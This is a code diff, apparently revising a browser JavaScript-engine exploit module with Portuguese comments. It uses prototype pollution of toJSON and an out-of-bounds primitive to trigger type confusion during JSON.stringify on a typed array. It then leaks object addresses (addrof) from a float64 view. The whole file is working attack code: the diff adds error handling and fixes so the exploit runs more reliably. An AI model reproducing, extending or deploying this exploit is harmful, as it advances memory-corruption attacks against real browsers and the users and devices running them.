@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v4_SeparateDetails_DebugLog)
+// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v4_SeparateDetails_DebugLog_Fix1)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
@@ -9,25 +9,26 @@ import {
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
+// Mantendo o nome do módulo da versão anterior para facilitar a sincronia com o runner desta vez
 export const FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS_DEBUG = "OriginalHeisenbug_TypedArrayAddrof_v4_SeparateDetails_DebugLog";
 
 const VICTIM_BUFFER_SIZE = 256;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
 
-let last_probe_call_details_v4d = null; // v4d para DebugLog
+let last_probe_call_details_v4d = null;
 let object_to_leak_A_v4d = null;
 let object_to_leak_B_v4d = null;
 let victim_typed_array_ref_v4d = null;
 
 function toJSON_TA_Probe_SeparateDetails_DebugLog() {
     let current_call_details = {
-        probe_variant: "TA_Probe_Addrof_v4_SeparateDetails_DebugLog",
+        probe_variant: "TA_Probe_Addrof_v4_SeparateDetails_DebugLog_Fix1", // Atualizado para Fix1
         this_type_in_toJSON: "N/A_before_call",
         error_in_toJSON: null,
         probe_called: true,
-        this_was_victim_ref_at_confusion: null,
-        writes_attempted: false // Nova flag para rastrear se as escritas ocorreram
+        this_was_victim_ref_at_confusion: null, 
+        writes_attempted: false 
     };
 
     try {
@@ -44,11 +45,11 @@ function toJSON_TA_Probe_SeparateDetails_DebugLog() {
 
             logS3(`[${current_call_details.probe_variant}] Attempting addrof writes on the confused 'this' ([object Object])...`, "warn");
             if (object_to_leak_A_v4d) {
-                this[0] = object_to_leak_A_v4d; // Estas escritas estão modificando o objeto 'this' desta chamada
+                this[0] = object_to_leak_A_v4d; 
                 logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_A_v4d to this[0].`, "info");
             }
             if (object_to_leak_B_v4d) {
-                this[1] = object_to_leak_B_v4d; // Estas escritas estão modificando o objeto 'this' desta chamada
+                this[1] = object_to_leak_B_v4d; 
                 logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_B_v4d to this[1].`, "info");
             }
             current_call_details.writes_attempted = true;
@@ -64,23 +65,23 @@ function toJSON_TA_Probe_SeparateDetails_DebugLog() {
         logS3(`[${current_call_details.probe_variant}] ERROR in probe: ${e.name} - ${e.message}`, "error");
     }
     
-    // Atualiza o registrador global com os detalhes desta chamada
     last_probe_call_details_v4d = { ...current_call_details };
     logS3(`[${current_call_details.probe_variant}] Probe FINISHING. Global 'last_probe_call_details_v4d' updated: ${JSON.stringify(last_probe_call_details_v4d)}`, "dev_verbose");
 
-    return { minimal_probe_v4d_did_execute: true }; 
+    return { minimal_probe_v4d_fix1_did_execute: true }; // Atualizado para Fix1
 }
 
 
-export async function executeTypedArrayVictimAddrofTest_SeparateDetails_DebugLog() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS_DEBUG}.triggerAndAddrof`;
-    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, SeparateDetails_DebugLog) & Addrof Attempt ---`, "test", FNAME_CURRENT_TEST);
-    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS_DEBUG} Init...`;
+export async function executeTypedArrayVictimAddrofTest_SeparateDetails_DebugLog() { // Nome da função mantido para compatibilidade com runner
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS_DEBUG}.triggerAndAddrof_Fix1`; // Atualizado para Fix1
+    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, SeparateDetails_DebugLog_Fix1) & Addrof Attempt ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS_DEBUG} Init (Fix1)...`; // Atualizado para Fix1
 
     last_probe_call_details_v4d = null; 
     victim_typed_array_ref_v4d = null;
-    object_to_leak_A_v4d = { marker: "ObjA_TA_v4d", id: Date.now() }; 
-    object_to_leak_B_v4d = { marker: "ObjB_TA_v4d", id: Date.now() + System.nanoTime() % 1000 }; // um pouco mais de variação
+    object_to_leak_A_v4d = { marker: "ObjA_TA_v4d_Fix1", id: Date.now() }; // Atualizado para Fix1
+    // CORREÇÃO: Removido System.nanoTime()
+    object_to_leak_B_v4d = { marker: "ObjB_TA_v4d_Fix1", id: Date.now() + 234 }; // Usando um offset fixo como antes
 
     let errorCapturedMain = null;
     let stringifyOutput = null; 
@@ -89,7 +90,7 @@ export async function executeTypedArrayVictimAddrofTest_SeparateDetails_DebugLog
     let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Not attempted or Heisenbug/write failed." };
     let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Not attempted or Heisenbug/write failed." };
     
-    const fillPattern = 0.33445566778899; // Mantendo o mesmo da v4 para comparação direta
+    const fillPattern = 0.33445566778899; 
 
     try {
         await triggerOOB_primitive({ force_reinit: true });
@@ -132,13 +133,11 @@ export async function executeTypedArrayVictimAddrofTest_SeparateDetails_DebugLog
             
             logS3(`  JSON.stringify(victim_typed_array_ref_v4d) completed. Stringify Output: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
             
-            // Log detalhado do 'last_probe_call_details_v4d' ANTES da cópia
             logS3(`  DEBUG: Global 'last_probe_call_details_v4d' state BEFORE copy: ${last_probe_call_details_v4d ? JSON.stringify(last_probe_call_details_v4d) : 'null'}`, "dev");
 
             if (last_probe_call_details_v4d) {
                 captured_probe_details_after_stringify = { ...last_probe_call_details_v4d }; 
             }
-            // Log detalhado do 'captured_probe_details_after_stringify' APÓS a cópia
             logS3(`  DEBUG: Copied 'captured_probe_details_after_stringify' state AFTER copy: ${captured_probe_details_after_stringify ? JSON.stringify(captured_probe_details_after_stringify) : 'N/A'}`, "dev");
 
 
@@ -147,7 +146,7 @@ export async function executeTypedArrayVictimAddrofTest_SeparateDetails_DebugLog
                 captured_probe_details_after_stringify.this_type_in_toJSON === "[object Object]") {
                 
                 logS3(`  HEISENBUG CONFIRMED (via captured last probe details)! 'this' type in last probe: ${captured_probe_details_after_stringify.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
-                logS3(`    In confused probe, 'this' === victim_typed_array_ref_v4d? ${captured_probe_details_after_stringify.this_was_victim_ref_at_confusion}`, "info");
+                logS3(`    In confused probe, 'this' === victim_typed_array_ref_v4d? ${captured_probe_details_after_stringify.this_was_victim_ref_at_confusion}`, "info"); // Nome da prop. atualizado
                 logS3(`    Writes attempted in confused probe? ${captured_probe_details_after_stringify.writes_attempted}`, "info");
                 
                 logS3("STEP 3: Checking float64_view_on_underlying_ab AFTER Heisenbug and probe's write attempts...", "warn", FNAME_CURRENT_TEST);
@@ -162,13 +161,12 @@ export async function executeTypedArrayVictimAddrofTest_SeparateDetails_DebugLog
                     (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                     logS3("  !!!! POTENTIAL POINTER READ at view[0] (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                     addrof_result_A.success = true;
-                    addrof_result_A.message = "Heisenbug (SeparateDetails_DebugLog) confirmed AND view[0] read suggests a pointer for ObjA.";
+                    addrof_result_A.message = "Heisenbug (SeparateDetails_DebugLog_Fix1) confirmed AND view[0] read suggests a pointer for ObjA.";
                 } else {
-                    addrof_result_A.message = "Heisenbug (SeparateDetails_DebugLog) confirmed, but view[0] read does not look like a pointer for ObjA or buffer was unchanged.";
+                    addrof_result_A.message = "Heisenbug (SeparateDetails_DebugLog_Fix1) confirmed, but view[0] read does not look like a pointer for ObjA or buffer was unchanged.";
                     if (val_A_double === (fillPattern + 0)) addrof_result_A.message += " (Value matches initial fillPattern)";
                 }
 
-                // ... (lógica para ObjB similar, omitida para brevidade, mas deve ser mantida no código real)
                 const val_B_double = float64_view_on_underlying_ab[1];
                 addrof_result_B.leaked_address_as_double = val_B_double;
                 let temp_buf_B = new ArrayBuffer(8); new Float64Array(temp_buf_B)[0] = val_B_double;
@@ -179,17 +177,17 @@ export async function executeTypedArrayVictimAddrofTest_SeparateDetails_DebugLog
                     (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                     logS3("  !!!! POTENTIAL POINTER READ at view[1] (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                     addrof_result_B.success = true;
-                    addrof_result_B.message = "Heisenbug (SeparateDetails_DebugLog) confirmed AND view[1] read suggests a pointer for ObjB.";
+                    addrof_result_B.message = "Heisenbug (SeparateDetails_DebugLog_Fix1) confirmed AND view[1] read suggests a pointer for ObjB.";
                 } else {
-                    addrof_result_B.message = "Heisenbug (SeparateDetails_DebugLog) confirmed, but view[1] read does not look like a pointer for ObjB or buffer was unchanged.";
+                    addrof_result_B.message = "Heisenbug (SeparateDetails_DebugLog_Fix1) confirmed, but view[1] read does not look like a pointer for ObjB or buffer was unchanged.";
                     if (val_B_double === (fillPattern + 1)) addrof_result_B.message += " (Value matches initial fillPattern)";
                 }
 
 
                 if (addrof_result_A.success || addrof_result_B.success) {
-                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS_DEBUG}: Addr? SUCESSO!`;
+                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS_DEBUG}: Addr? SUCESSO (Fix1)!`;
                 } else {
-                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS_DEBUG}: Heisenbug OK, Addr Falhou`;
+                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS_DEBUG}: Heisenbug OK, Addr Falhou (Fix1)`;
                 }
 
             } else {
@@ -203,13 +201,15 @@ export async function executeTypedArrayVictimAddrofTest_SeparateDetails_DebugLog
                 }
                 addrof_result_A.message = msg; addrof_result_B.message = msg;
                 logS3(`  ALERT: ${msg}`, "error", FNAME_CURRENT_TEST);
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS_DEBUG}: Heisenbug Falhou`;
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS_DEBUG}: Heisenbug Falhou (Fix1)`;
             }
 
         } catch (e_str) {
             errorCapturedMain = e_str;
             logS3(`    CRITICAL ERROR during JSON.stringify or addrof logic: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
-            // ... (mensagens de erro e título)
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS_DEBUG}: Stringify/Addrof ERR (Fix1)`;
+            addrof_result_A.message = `Main execution error: ${e_str.name} - ${e_str.message}`;
+            addrof_result_B.message = `Main execution error: ${e_str.name} - ${e_str.message}`;
         } finally {
             if (pollutionApplied) {
                 if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
@@ -220,11 +220,14 @@ export async function executeTypedArrayVictimAddrofTest_SeparateDetails_DebugLog
 
     } catch (e_outer_main) {
         errorCapturedMain = e_outer_main;
-        // ... (mensagens de erro e título)
+        logS3(`OVERALL CRITICAL ERROR in test: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
+        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
+        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS_DEBUG} CRITICALLY FAILED (Fix1)`;
+        addrof_result_A.message = `Overall test error: ${e_outer_main.name}`;
+        addrof_result_B.message = `Overall test error: ${e_outer_main.name}`;
     } finally {
         clearOOBEnvironment();
         logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
-        // ... (logs de resultado final)
         logS3(`Addrof A Result (view[0]): Success=${addrof_result_A.success}, Msg='${addrof_result_A.message}'`, addrof_result_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
         if(addrof_result_A.leaked_address_as_int64){
             logS3(`  Addrof A (Int64): ${addrof_result_A.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
